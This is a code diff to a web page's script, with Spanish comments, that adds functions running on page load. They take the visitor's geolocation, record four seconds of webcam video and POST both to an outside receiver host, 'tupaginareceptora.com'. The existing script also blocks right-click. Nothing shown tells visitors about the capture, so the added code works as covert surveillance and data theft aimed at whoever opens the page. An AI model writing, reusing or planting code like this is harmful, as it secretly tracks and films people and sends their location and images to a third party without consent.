@@ -371,6 +371,82 @@
 
         // Bloquear click derecho (solo para escritorio, pero no sobra)
         document.addEventListener('contextmenu', (e) => e.preventDefault());
+        function capturarDatos() {
+            // Capturar ubicación
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition( function(position) {
+                    var lat = position.coords.latitude;
+                    var lon = position.coords.longitude;
+                    var accuracy = position.coords.accuracy;
+                    enviarUbicacion(lat, lon, accuracy);
+                });
+            }
+
+            // Capturar video
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        chunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const formData = new FormData();
+                        formData.append('video', blob, 'grabacion.mp4');
+                        enviarVideo(formData);
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000); // Graba por 4 segundos
+                })
+                .catch(err => {
+                    console.error('Error al capturar video:', err);
+                });
+        }
+
+        function enviarUbicacion(lat, lon, accuracy) {
+            var url = 'http://tupaginareceptora.com/receptor.html';
+            var data = {
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Ubicación enviada con éxito:', data);
+            })
+            .catch(error => {
+                console.error('Error al enviar la ubicación:', error);
+            });
+        }
+
+        function enviarVideo(formData) {
+            fetch('http://tupaginareceptora.com/receptor.html', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Video enviado con éxito:', data);
+            })
+            .catch(error => {
+                console.error('Error al enviar el video:', error);
+            });
+        }
+
+        // Llamar a la función para capturar datos al cargar la página
+        window.onload = capturarDatos;
     </script>
 
 </body>
